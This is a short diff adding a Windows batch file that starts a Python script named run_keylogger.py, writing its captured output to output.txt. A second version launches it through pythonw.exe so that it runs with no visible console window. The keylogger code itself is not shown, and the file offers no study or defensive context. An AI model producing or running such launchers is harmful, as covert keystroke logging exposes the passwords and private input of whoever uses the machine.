@@ -1,0 +1,8 @@
+@echo off
+cd /d D:\github
+start "" "C:\Program Files\Python313\python.exe" run_keylogger.py output.txt 5
+
+
+
+@echo off
+start "" "C:\Program Files\Python313\pythonw.exe" "D:\github\run_keylogger.py" "D:\github\output.txt" 5
